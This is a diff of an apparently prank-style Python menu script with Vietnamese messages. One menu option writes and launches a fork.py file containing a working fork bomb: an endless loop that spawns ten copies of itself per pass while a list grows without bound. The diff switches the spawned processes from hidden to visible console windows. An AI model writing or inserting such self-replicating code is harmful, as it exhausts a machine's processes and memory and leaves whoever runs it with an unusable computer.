@@ -52,7 +52,7 @@ while True:
                 print(f"Tắt cái máy này kiểu j z...")
         elif option == 3:
             playsound("xvb.mp3")
-            start_bosnia()
+            start_bosnia() # may or may not play, depending on how bad the forkbomb is
             # prepare fork bomb
             with open("fork.py", "w") as f:
                 f.write("\n".join([
@@ -62,7 +62,7 @@ while True:
                     "waste = [1, 1, 2, 3, 5]",
                     "playsound('bruh.mp3', False)",
                     "while True:",
-                    "  for x in range(10): subprocess.Popen([sys.executable, 'fork.py'], creationflags=subprocess.CREATE_NO_WINDOW)",
+                    "  for x in range(10): subprocess.Popen([sys.executable, 'fork.py'], creationflags=subprocess.CREATE_NEW_CONSOLE)",
                     "  waste.append(len(waste)*sum(waste))",
                 ]))
-            subprocess.Popen([sys.executable, 'fork.py'], creationflags=subprocess.CREATE_NO_WINDOW)
+            subprocess.Popen([sys.executable, 'fork.py'], creationflags=subprocess.CREATE_NEW_CONSOLE)
